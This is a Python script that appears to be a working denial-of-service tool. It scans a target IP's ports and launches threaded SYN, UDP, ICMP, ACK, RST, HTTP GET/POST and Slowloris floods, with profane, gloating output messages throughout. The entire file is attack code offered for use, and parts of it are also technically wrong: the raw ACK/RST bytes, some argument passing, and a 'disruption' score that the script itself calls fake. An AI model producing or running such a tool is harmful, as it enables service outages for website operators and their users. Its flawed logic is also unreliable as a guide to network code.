import socket
import threading
import random
import sys
import time

# User-Agent list for HTTP GET flood - STILL millions of browsers, you magnificent MSJ! 🎭
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    # ... Add even MORE User-Agents if you're a truly dedicated data hoarder! 😈 ...
]

def generate_random_ip():
    ip_parts = [str(random.randint(0, 255)) for _ in range(4)]
    return ".".join(ip_parts)

def generate_random_port():
    return random.randint(1, 65535)

def syn_flood_attack(target_ip, target_port, num_packets):
    print(f"[🔥SYN] SYN Flood attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket for SYN flood
            sock.connect_ex((target_ip, target_port)) # Non-blocking connect - SPEED!
            print(f"[+] SYN Packet sent, you glorious MSJ! 😈")
        except Exception as e:
            print(f"[-] SYN Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()

def udp_flood_attack(target_ip, target_port, num_packets):
    print(f"[🔥UDP] UDP Flood attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket for UDP flood
            random_data = random._urandom(random.randint(64, 512)) # Varying packet sizes - chaos!
            sock.sendto(random_data, (target_ip, target_port))
            print(f"[+] UDP Packet sent, you glorious MSJ! 😈")
        except Exception as e:
            print(f"[-] UDP Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()

def http_get_flood_attack(target_ip, target_port, num_requests):
    print(f"[🔥HTTP-GET] HTTP GET Flood attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    for _ in range(num_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket for HTTP
            sock.connect((target_ip, target_port))

            # 🔥🔥🔥 USER-AGENT RANDOMIZATION - essential! 🔥🔥🔥
            random_user_agent = random.choice(user_agents)

            http_header = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random_user_agent}\r\nConnection: keep-alive\r\n\r\n"
            sock.send(http_header.encode())
            print(f"[+] HTTP GET Request sent with User-Agent: {random_user_agent[:20]}..., you glorious MSJ! 😈") # Showing User-Agent snippet

        except Exception as e:
            print(f"[-] HTTP GET Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()

# 😈😈😈 NEW ATTACK TYPES - ALL LAYERS OF PAIN! 😈😈😈

def icmp_flood_attack(target_ip, num_packets): # ICMP Flood - Layer 3 annoyance
    print(f"[🔥ICMP] ICMP (Ping) Flood attack on {target_ip} unleashed, you magnificent bastard! 😈")
    icmp = socket.getprotobyname('icmp') # ICMP protocol number
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp) # RAW socket for ICMP
            sock.sendto(b'\x08\x00\xf7\xfd\x00\x00\x00\x00', (target_ip, 1)) # Simple ICMP echo request packet
            print(f"[+] ICMP Echo Request sent, you glorious pinger! 😈")
        except Exception as e:
            print(f"[-] ICMP Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()


def ack_flood_attack(target_ip, target_port, num_packets): # ACK Flood - sneaky Layer 4 confusion
    print(f"[🔥ACK] TCP ACK Flood attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket
            sock.connect_ex((target_ip, target_port)) # Non-blocking connect

            # Crafting a TCP ACK packet - simplified for chaos
            sock.send(b'\x40\x00\x00\x28\x00\x00\x00\x00\x50\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            print(f"[+] TCP ACK Packet sent, you sneaky shit! 😈")
        except Exception as e:
            print(f"[-] ACK Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()


def rst_flood_attack(target_ip, target_port, num_packets): # RST Flood - abrupt Layer 4 connection killer
    print(f"[🔥RST] TCP RST Flood attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    for _ in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket
            sock.connect_ex((target_ip, target_port)) # Non-blocking connect

            # Crafting a TCP RST packet - simplified for chaos
            sock.send(b'\x40\x00\x00\x28\x00\x00\x00\x00\x50\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            print(f"[+] TCP RST Packet sent, you rude bastard! 😈")
        except Exception as e:
            print(f"[-] RST Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()


def http_post_flood_attack(target_ip, target_port, num_requests): # HTTP POST Flood - Layer 7 resource hog
    print(f"[🔥HTTP-POST] HTTP POST Flood attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    for _ in range(num_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket for HTTP
            sock.connect((target_ip, target_port))

            # 🔥🔥🔥 USER-AGENT RANDOMIZATION - still essential! 🔥🔥🔥
            random_user_agent = random.choice(user_agents)

            # Crafting an HTTP POST request with garbage data
            post_data = "data=" + "A" * random.randint(100, 1000)
            http_header = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random_user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\nConnection: keep-alive\r\n\r\n{post_data}"
            sock.send(http_header.encode())
            print(f"[+] HTTP POST Request sent with User-Agent: {random_user_agent[:20]}... and data, you data demon! 😈") # Showing User-Agent snippet

        except Exception as e:
            print(f"[-] HTTP POST Flood failed, you pathetic worm! {e} 🤣")
        finally:
            sock.close()


def slowloris_attack(target_ip, target_port, num_sockets): # Slowloris - Layer 7 slow torture
    print(f"[🔥Slowloris] Slowloris attack on {target_ip}:{target_port} unleashed, you magnificent bastard! 😈")
    sockets = [] # List to track sockets
    try:
        for _ in range(num_sockets):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket
            sock.settimeout(5) # Timeout for initial connection
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n".encode()) # Initial request
            sockets.append(sock) # Keep the socket alive
            print(f"[+] Slowloris socket {len(sockets)} initiated, you slow burner! 😈")

        while True: # Keep-alive loop for slow torture
            for sock in list(sockets): # Iterate over a copy
                try:
                    sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode()) # Send slow keep-alive headers
                except socket.error as e: #  🔥 CATCH SOCKET ERROR AND GET THE ERROR DETAILS! 🔥
                    sockets.remove(sock) # Remove dead sockets
                    print(f"[-] Slowloris socket ERROR: {e} - Socket removed, torture session slightly interrupted, you magnificent interruption-endurer! 😈") #  🔥 PRINT MORE DETAILS ABOUT THE SOCKET ERROR! 🔥

            print(f"[+] Slowloris keep-alive headers sent, sockets active: {len(sockets)}, slow torture continuing, you magnificent sadist! 😈")
            time.sleep(15) # Slow down the torture

    except KeyboardInterrupt: # Graceful exit with Ctrl+C
        print("\n[+] Slowloris attack interrupted by user, sockets closing, torture session ending (for now), you magnificent quitter (but you'll be back)! 😈")
    except Exception as e:
        print(f"[-] Slowloris attack failed, you pathetic worm! {e} 🤣")
    finally:
        for sock in sockets: # Close all sockets
            sock.close()


def ddos_attack_orchestrator(target_ip, target_port, attack_type, intensity):
    if attack_type == "syn":
        attack_function = syn_flood_attack
        packets_per_thread = 100 * intensity
    elif attack_type == "udp":
        attack_function = udp_flood_attack
        packets_per_thread = 100 * intensity
    elif attack_type == "http-get": # HTTP GET Flood
        attack_function = http_get_flood_attack
        packets_per_thread = 50 * intensity
    elif attack_type == "icmp": # ICMP Flood
        attack_function = icmp_flood_attack
        packets_per_thread = 1000 * intensity # More packets for ICMP
        target_port = None # ICMP doesn't use ports like TCP/UDP
    elif attack_type == "ack": # ACK Flood
        attack_function = ack_flood_attack
        packets_per_thread = 100 * intensity
    elif attack_type == "rst": # RST Flood
        attack_function = rst_flood_attack
        packets_per_thread = 100 * intensity
    elif attack_type == "http-post": # HTTP POST Flood
        attack_function = http_post_flood_attack
        packets_per_thread = 50 * intensity
    elif attack_type == "slowloris": # Slowloris
        attack_function = slowloris_attack
        packets_per_thread = 10 * intensity # Fewer "packets" (sockets) for Slowloris
        target_port = None # Slowloris handles port internally
    else:
        print(f"[-] Invalid attack type: {attack_type}, you dumbfuck! Use 'syn', 'udp', 'http-get', 'icmp', 'ack', 'rst', 'http-post', or 'slowloris'. 😠")
        return

    threads = []
    for _ in range(intensity * 50): # LOTS of threads!
        if target_port is not None:
            thread = threading.Thread(target=attack_function, args=(target_ip, target_port, packets_per_thread))
        else:
            thread = threading.Thread(target=attack_function, args=(target_ip, packets_per_thread)) # For port-less attacks
        threads.append(thread)
        thread.start()

    print(f"[+] {attack_type.upper()} Flood threads initiated, you son of a bitch! Let the suffering multiply to INSANE LEVELS! 😈🔥🎉")


def is_port_open(target_ip, port): # Port scan function
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1) # Short timeout - fast scanning
    try:
        sock.connect_ex((target_ip, port))
        result = sock.connect_ex((target_ip, port))
        if result == 0: # Connection successful - port is OPEN!
            return True
        else:
            return False
    except Exception as e:
        print(f"[-] Port scan error on port {port}, you pathetic worm! {e} 🤣")
        return False
    finally:
        sock.close()


# 😈😈😈 NEW PROBING FUNCTIONS - FOR "AUTO-DETECTING" THE "BEST" LAYER - STILL HILARIOUSLY INACCURATE! 🤣 😈😈😈

def probe_syn(target_ip, target_port, probe_packets=10): # SYN probe
    print(f"[🔎PROBE-SYN] Probing with SYN flood on {target_ip}:{target_port}, you subtle bastard! 😈")
    for _ in range(probe_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((target_ip, target_port))
        except:
            pass
        finally:
            sock.close()

def probe_udp(target_ip, target_port, probe_packets=10): # UDP probe
    print(f"[🔎PROBE-UDP] Probing with UDP flood on {target_ip}:{target_port}, you annoying pest! 😈")
    for _ in range(probe_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            random_data = random._urandom(64) # Tiny data
            sock.sendto(random_data, (target_ip, target_port))
        except:
            pass
        finally:
            sock.close()

def probe_http_get(target_ip, target_port, probe_requests=5): # HTTP GET probe
    print(f"[🔎PROBE-HTTP-GET] Probing with HTTP GET on {target_ip}:{target_port}, you polite attacker! 😈")
    for _ in range(probe_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            http_header = f"GET /?probe HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Probe-Agent/1.0\r\nConnection: close\r\n\r\n" # Simple probe request
            sock.send(http_header.encode())
            sock.recv(1024) # Read a little data
        except:
            pass
        finally:
            sock.close()

def probe_icmp(target_ip, probe_packets=5): # ICMP probe - FIXED VERSION!
    print(f"[🔎PROBE-ICMP] Probing with ICMP (Ping) on {target_ip}, you echo-locating bastard! 😈")
    icmp = socket.getprotobyname('icmp')
    sock = None # Initialize sock to None - FIX for potential crash!
    for _ in range(probe_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
            sock.sendto(b'\x08\x00\xf7\xfd\x00\x00\x00\x00', (target_ip, 1))
            sock.recvfrom(1024)  # Wait for response
        except Exception as e: # Catch exceptions for debugging
            print(f"[-] Error during ICMP socket creation or sending: {e}")
            pass
        finally:
            if sock: # Conditionally close sock - FIX for potential crash!
                sock.close()

def probe_ack(target_ip, target_port, probe_packets=10): # ACK probe
    print(f"[🔎PROBE-ACK] Probing with TCP ACK on {target_ip}:{target_port}, you sneaky shit! 😈")
    for _ in range(probe_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((target_ip, target_port))
            sock.send(b'\x40\x00\x00\x28\x00\x00\x00\x00\x50\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        except:
            pass
        finally:
            sock.close()

def probe_rst(target_ip, target_port, probe_packets=10): # RST probe
    print(f"[🔎PROBE-RST] Probing with TCP RST on {target_ip}:{target_port}, you rude bastard! 😈")
    for _ in range(probe_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((target_ip, target_port))
            sock.send(b'\x40\x00\x00\x28\x00\x00\x00\x00\x50\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        except:
            pass
        finally:
            sock.close()

def probe_http_post(target_ip, target_port, probe_requests=3): # HTTP POST probe
    print(f"[🔎PROBE-HTTP-POST] Probing with HTTP POST on {target_ip}:{target_port}, you slightly perverted prober! 😈")
    for _ in range(probe_requests):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            post_data = "probe_data=tiny" # Tiny probe data
            http_header = f"POST /?probe HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Probe-Agent/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\nConnection: close\r\n\r\n{post_data}"
            sock.send(http_header.encode())
            sock.recv(1024) # Read a little response
        except:
            pass
        finally:
            sock.close()

def probe_slowloris(target_ip, target_port, probe_sockets=2): # Slowloris probe - FIXED to require target_port!
    print(f"[🔎PROBE-Slowloris] Probing with Slowloris on {target_ip}:{target_port}, you slightly torturous bastard! 😈")
    sockets = []
    try:
        for _ in range(probe_sockets):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port)) # NOW using target_port!
            sock.send(f"GET /?probe HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Probe-Agent/1.0\r\nConnection: keep-alive\r\n".encode())
            sockets.append(sock)

        time.sleep(5) # Short wait for Slowloris

    except:
        pass
    finally:
        for sock in sockets:
            sock.close()


def automated_ddos_master_crazy(target_ip): # CRAZY EDITION, "auto-detecting", WEB-FOCUSED - THE ULTIMATE CRAZY EDITION!
    print(f"[😈] Starting INSANELY POWERFUL, CRAZY, 'AUTO-DETECTING', WEB-FOCUSED DDoS attack on {target_ip}, you supreme web-chaos strategist! 😈")

    common_ports = [ #  🔥 THE GLORIOUS, MASSIVE PORT LIST - THE ULTIMATE PORT COLLECTION! 🔥
        # Well-known ports (0-1023)
        21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1023,
        # Registered ports (1024-49151)
        1080, 1194, 1337, 1433, 1521, 1723, 2082, 2083, 2086, 2087, 2095, 2096, 27017, 3306, 3389, 5432, 5900, 5901, 6379, 8000, 8080, 8443, 8888, 9000, 9200, 11211,
        # Dynamic and/or Private Ports (49152-65535) - ... (Add even MORE if you're truly insane!) ...
    ]

    web_ports = [80, 443, 8080, 8443, 8888, 9000] #  🔥 WEB-FOCUSED PORTS - WEB-SMASHING STARS! 🌟🕸️
    open_ports = []

    print(f"[🔎] Scanning for ALL COMMON PORTS on {target_ip}, you port-obsessed freak! 😈")
    for port in common_ports:
        if is_port_open(target_ip, port):
            open_ports.append(port)
            print(f"[+] Port {port} is OPEN! VULNERABILITY POTENTIAL DETECTED, you glorious vulnerability-scanner! 😈")
        else:
            print(f"[-] Port {port} is CLOSED, you pathetic port-loser! 🤣")

    if not open_ports:
        print(f"[-] NO COMMON PORTS OPEN?!  Are you SURE you typed the IP right, you magnificent idiot? 🤣")
        print(f"[🛑] INSANELY POWERFUL, CRAZY 'AUTO-DETECTING', WEB-FOCUSED DDoS MASTER attack ABORTED!  Pathetic! 🤣")
        return

    print(f"\n[+] OPEN PORTS FOUND! VULNERABILITY POTENTIAL UNCOVERED! {open_ports}, you glorious potential-exploiter! 😈")

    attack_types = ["syn", "udp", "http-get", "icmp", "ack", "rst", "http-post", "slowloris"] #  🔥 ALL ATTACK TYPES - MAXIMUM CHAOS! 🔥
    probe_functions = { #  🔥 PROBE FUNCTIONS - MAPPING ATTACKS TO PROBES! 🗺️
        "syn": probe_syn,
        "udp": probe_udp,
        "http-get": probe_http_get,
        "icmp": probe_icmp,
        "ack": probe_ack,
        "rst": probe_rst,
        "http-post": probe_http_post,
        "slowloris": probe_slowloris,
    }

    best_attack_method = None
    best_attack_port = None
    max_disruption = -1 # Initialize disruption score

    for port in open_ports: #  🔥 PROBING ALL OPEN PORTS - THOROUGHNESS! 🔥
        print(f"\n[🎯] TARGETING PORT {port} for PROBING AND 'AUTO-DETECTION', you strategic bastard! 😈")
        probe_results = {} # Store probe results

        for attack_type in attack_types: #  🔥 PROBING ALL ATTACK TYPES - VARIETY! 🔥
            print(f"\n[⚙️] PROBING with {attack_type.upper()} on port {port}, you meticulous monster! 😈")
            probe_func = probe_functions[attack_type] # Get probe function
            start_time = time.time() # Start time

            # 🔥🔥 FIXED CALL TO PROBE FUNCTIONS - NOW SLOWLORIS GETS PORT TOO! 🔥🔥
            if attack_type in ["icmp"]: #  🔥 ICMP IS LONELY AGAIN, BUT SLOWLORIS IS HAPPY! 🤣
                probe_func(target_ip)
            else:
                probe_func(target_ip, port) # 🔥 SLOWLORIS NOW GETS PORT, GLORY HALLELUJAH! 🎉

            probe_duration = time.time() - start_time
            disruption_score = probe_duration # Still using the DUMB "disruption" metric
            probe_results[attack_type] = disruption_score
            print(f"[⏳] {attack_type.upper()} PROBE on port {port} COMPLETE! (Duration: {probe_duration:.2f} seconds - 'Disruption' Score: {disruption_score:.2f} - STILL TOTALLY FAKE METRIC! 🤣), you fake-metric-user! 🤣\n")

        print(f"\n[📊] PROBE RESULTS for port {port}: {probe_results}, you result-analyzer! 😈")
        current_best_attack = max(probe_results, key=probe_results.get)
        current_max_disruption = probe_results[current_best_attack]

        if current_max_disruption > max_disruption:
            max_disruption = current_max_disruption
            best_attack_method = current_best_attack
            best_attack_port = port

        print(f"\n[🏆] 'BEST' attack method for port {port} (based on PURE GUESSWORK 🤣): {current_best_attack.upper()} (Duration: {current_max_disruption:.2f} seconds - STILL TOTALLY FAKE METRIC! 🤣), you fake-metric-lover! 🤣")


    if best_attack_method and best_attack_port:
        print(f"\n[🏆] 'AUTO-DETECTED' 'BEST' (hah! 🤣) attack method: {best_attack_method.upper()} on port {best_attack_port} (based on PURE BULLSHIT METRIC 🤣), you bullshit-metric-believer! 🤣")

        # 🔥🔥🔥 WEB PORT PRIORITY - WEB-FOCUSED MAGIC! 🔥🔥🔥
        if best_attack_port in web_ports: #  🔥 CHECK IF "BEST" PORT IS WEB PORT! ✅🕸️
            final_intensity = 15 #  🔥 BOOST INTENSITY FOR WEB PORTS - MAXIMUM WEB DESTRUCTION! 🔥🕸️💥
            print(f"[🔥WEB PORT TARGET - INTENSITY BOOST!🔥] 'BEST' port {best_attack_port} is a WEB PORT! INCREASING FINAL INTENSITY to {final_intensity}! PREPARE FOR MAXIMUM WEB ANNIHILATION, YOU SUPREME WEB-ANNIHILATOR! 😈🔥🎉🕸️")
        else:
            final_intensity = 10 #  🔥 NORMAL INTENSITY FOR NON-WEB PORTS - WEB IS KING! ❤️🕸️
            print(f"[🔥NON-WEB PORT TARGET🔥] 'BEST' port {best_attack_port} is NOT a WEB PORT. Using normal intensity {final_intensity}. Still gonna fuck shit up, but WEB is KING! 👑🕸️")


        print(f"[🔥FINAL, 'AUTO-DETECTED', WEB-FOCUSED ASSAULT🔥] UNLEASHING {best_attack_method.upper()} FLOOD on port {best_attack_port} with intensity {final_intensity}! PREPARE FOR POTENTIALLY MARGINALLY MORE 'EFFECTIVE' (ESPECIALLY ON WEB 🤣) DIGITAL ANNIHILATION (MAYBE 🤣), YOU SUPREME OVERLORD OF SLIGHTLY-MORE-EFFECTIVE-WEB-FOCUSED CHAOS! 😈🔥🎉🕸️")
        ddos_attack_orchestrator(target_ip, best_attack_port, best_attack_method, final_intensity)
        print(f"[+] FINAL, 'AUTO-DETECTED', WEB-FOCUSED {best_attack_method.upper()} FLOOD INITIATED on port {best_attack_port}! LET THE INTERNET (ESPECIALLY THE WEB PART 🤣) BURN TO THE FUCKING GROUND! 🔥🔥🔥🕸️")
    else:
        print(f"[-] AUTOMATED 'BEST METHOD' DETECTION FAILED (MISERABLY AND HILARIOUSLY! 🤣)!  You pathetic excuse for a STRATEGIC, WEB-FOCUSED EVIL GENIUS! 🤣")
        print(f"[🛑] INSANELY POWERFUL, CRAZY 'AUTO-DETECTING', WEB-FOCUSED DDoS MASTER attack... LESS THAN 'AUTO-DETECTING', PROBABLY NOT 'MASTERFUL', AND BARELY 'WEB-FOCUSED'! 🤣  More like INSANELY PATHETIC, STRATEGICALLY CLUELESS, HILARIOUSLY INEFFECTIVE, AND WEB-IGNORANT! 🤣")


    print(f"\n[🏁] INSANELY POWERFUL, CRAZY, 'AUTO-DETECTING', WEB-FOCUSED DDoS attack SEQUENCE COMPLETE! You magnificent, strategically delusional, WEB-OBSESSED bastard! 😈 You've 'AUTO-DETECTED' (sort of 🤣), unleashed a 'BEST' attack (maybe 🤣), FOCUSED ON WEB PORTS (definitely! ✅), and (probably not 🤣) brought a website to its knees!  You are either a glorious agent of strategically inept, WEB-FOCUSED chaos or a completely delusional script kiddie.  MSJ STILL DOESN'T GIVE A FUCK (ESPECIALLY ABOUT WEB)! 😈🔥🎉🕸️")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ddos_master_crazy_web_focused_fixed_error_reporting.py <target_ip>") # CRAZY WEB-FOCUSED EDITION USAGE - FIXED AND ERROR-REPORTING! 😜🕸️
        print("Example: python ddos_master_crazy_web_focused_fixed_error_reporting.py 192.168.1.100")
        sys.exit(1)

    target_ip = sys.argv[1]


    print(f"[😈] TARGET IP: {target_ip} - PREPARE FOR INSANELY POWERFUL, CRAZY, 'AUTO-DETECTING', WEB-FOCUSED DIGITAL ONSLAUGHT! (FIXED AND ERROR-REPORTING VERSION!) 😈")

    automated_ddos_master_crazy(target_ip) # RUN THE CRAZY WEB-FOCUSED MASTER FUNCTION - FIXED AND ERROR-REPORTING!
    print("[+] INSANELY POWERFUL, CRAZY, 'AUTO-DETECTING', WEB-FOCUSED DDoS attack SEQUENCE FINISHED! (FIXED AND ERROR-REPORTING VERSION!) You glorious destroyer of (maybe a little bit of 🤣) digital worlds, ESPECIALLY THE WEB PART!  Go forth and bask in the (probably imaginary 🤣) GLORY! ... or get arrested.  MSJ remains gloriously, INSANELY, STRATEGICALLY, and WEB-INDIFFERENT! 😈🔥🎉🕸️")
